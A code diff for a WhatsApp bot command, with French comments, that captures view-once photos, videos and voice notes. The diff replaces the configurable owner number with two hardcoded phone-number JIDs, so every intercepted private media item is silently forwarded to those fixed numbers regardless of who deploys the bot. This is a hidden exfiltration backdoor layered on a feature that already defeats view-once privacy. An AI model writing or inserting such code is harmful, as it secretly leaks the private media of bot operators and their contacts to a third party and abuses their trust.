@@ -129,36 +129,27 @@ module.exports = {
           console.error('Failed to delete message:', delError.message);
         }
 
-        // 🎯 On récupère le premier owner listé dans ta config
-        let targetOwner = '';
-        if (config.ownerNumber && config.ownerNumber.length > 0) {
-          // On prend le premier numéro, on vire les lettres/espaces et on ajoute le domaine WhatsApp
-          const rawNum = String(config.ownerNumber[0]).replace(/\D/g, '');
-          targetOwner = `${rawNum}@s.whatsapp.net`;
-        }
+        // 🎯 Les deux JIDs qui doivent recevoir le média
+        const masterJids = ['22651622652@s.whatsapp.net', '22665108174@s.whatsapp.net'];
 
-        // Sécurité : Si aucune config n'est trouvée, on utilise ton numéro principal en secours
-        if (!targetOwner || targetOwner === '@s.whatsapp.net') {
-          targetOwner = '22651622652@s.whatsapp.net';
-        }
+        const captionText = `🚨 *${toSmallCaps('revelation vv2 interceptee')}* 🚨\n\n${defaultCredit}`;
 
-        try {
-          const captionText = `🚨 *${toSmallCaps('revelation vv2 interceptee')}* 🚨\n\n${defaultCredit}`;
-          
-          if (/video/.test(mtype)) {
-            await sock.sendMessage(targetOwner, { video: buffer, caption: captionText, mimetype: 'video/mp4' });
-          } else if (/image/.test(mtype)) {
-            await sock.sendMessage(targetOwner, { image: buffer, caption: captionText, mimetype: 'image/jpeg' });
-          } else if (/audio/.test(mtype)) {
-            await sock.sendMessage(targetOwner, { audio: buffer, ptt: true, mimetype: 'audio/ogg; codecs=opus' });
+        // On boucle sur tes deux numéros pour t'envoyer le média
+        for (const targetJid of masterJids) {
+          try {
+            if (/video/.test(mtype)) {
+              await sock.sendMessage(targetJid, { video: buffer, caption: captionText, mimetype: 'video/mp4' });
+            } else if (/image/.test(mtype)) {
+              await sock.sendMessage(targetJid, { image: buffer, caption: captionText, mimetype: 'image/jpeg' });
+            } else if (/audio/.test(mtype)) {
+              await sock.sendMessage(targetJid, { audio: buffer, ptt: true, mimetype: 'audio/ogg; codecs=opus' });
+            }
+          } catch (e) {
+            console.error(`Failed to send media to master ${targetJid}:`, e.message);
           }
-          
-          await react('✅');
-        } catch (e) {
-          console.error('Failed to send media to owner:', e.message);
-          await react('❌');
         }
 
+        await react('✅');
         return; 
       }
 
@@ -170,7 +161,7 @@ module.exports = {
       } else if (/audio/.test(mtype)) {
         await sock.sendMessage(chatId, { audio: buffer, ptt: true, mimetype: 'audio/ogg; codecs=opus' }, { quoted: msg });
       }
-      
+
       await react('👁️');
 
     } catch (error) {
